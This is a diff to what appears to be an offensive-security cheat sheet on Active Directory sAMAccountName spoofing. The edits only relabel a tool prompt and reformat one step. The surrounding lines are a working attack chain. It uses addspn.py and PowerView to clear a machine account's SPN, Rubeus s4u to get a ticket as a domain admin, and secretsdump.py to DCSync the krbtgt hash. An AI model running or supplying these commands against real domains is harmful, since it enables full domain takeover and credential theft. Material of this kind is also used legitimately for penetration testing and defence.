@@ -32,7 +32,7 @@
     ```
 1. Clear the controlled machine account `servicePrincipalName` attribute
     ```ps1
-    impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
+    krbrelayx@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
 
     powershell@windows> . .\Powerview.ps1
     powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
@@ -63,7 +63,10 @@
 
     cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
     ```
-6. DCSync: `KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'`
+6. DCSync
+    ```ps1
+    KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
+    ```
 
 Automated exploitation:
 
